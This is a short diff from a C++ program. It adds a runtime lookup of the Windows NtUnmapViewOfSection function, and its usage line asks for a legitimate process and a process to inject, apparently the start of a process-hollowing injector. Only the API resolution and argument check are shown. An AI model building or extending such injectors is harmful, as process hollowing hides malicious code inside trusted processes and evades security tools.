@@ -8,6 +8,16 @@ void ErrorExit(const char* message) {
     exit(1);
 }
 
+typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress
+    );
+
+pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(
+    GetModuleHandleA("ntdll.dll"),
+    "NtUnmapViewOfSection"
+);
+
 int main(int argc, char* argv[]) {
     if (argc != 3) {
         std::cout << "Usage: " << argv[0] << " <legitimate_process> <process_to_inject>" << std::endl;
